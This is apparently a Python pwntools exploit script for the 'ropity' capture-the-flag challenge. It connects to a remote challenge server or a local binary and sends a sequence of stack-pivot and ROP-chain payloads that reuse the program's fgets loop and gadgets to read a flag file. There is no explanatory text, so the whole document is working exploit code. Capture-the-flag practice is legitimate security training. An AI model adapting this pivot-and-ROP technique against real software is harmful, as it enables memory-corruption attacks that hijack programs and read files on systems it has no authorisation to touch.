#!/usr/bin/python3

from pwn import *

exe = ELF('vuln', checksec=False)

context.binary = exe

info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)
sln = lambda msg, num: sla(msg, str(num).encode())
sn = lambda msg, num: sa(msg, str(num).encode())

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
        b* 0x40115A   
        
        c
        ''')
        input()


if args.REMOTE:
    p = remote('ropity.chal.imaginaryctf.org', 1337)
else:
    p = process(exe.path)
addrsp = 0x0000000000401016
leave_ret = 0x000000000040115a+1
fgets_for_loop = 0x401142
pop_rbp = 0x40119B
GDB()
buf = 0x404800+8

pa = b'aaaaaaaa' + flat(
    buf+0x100, fgets_for_loop
)
sl(pa)
input()
pa = b'aaaaaaaa' + flat(
    buf, fgets_for_loop, 0x401165
)
sl(pa)
input()
pa = b'c'*8 + flat(
    buf+0x18, 0x401165, 0,fgets_for_loop, 
)
sl(pa)
input()
pa = b'\0'*8 + (b"flag/txt") +p64(0x401000)+ p64(0x401183) + p64(0) + p64(0x401169)
sl(pa)
# input()
# pa = b'a'*8 + flat(0x404800-0x10,)
# sl(pa)
p.interactive()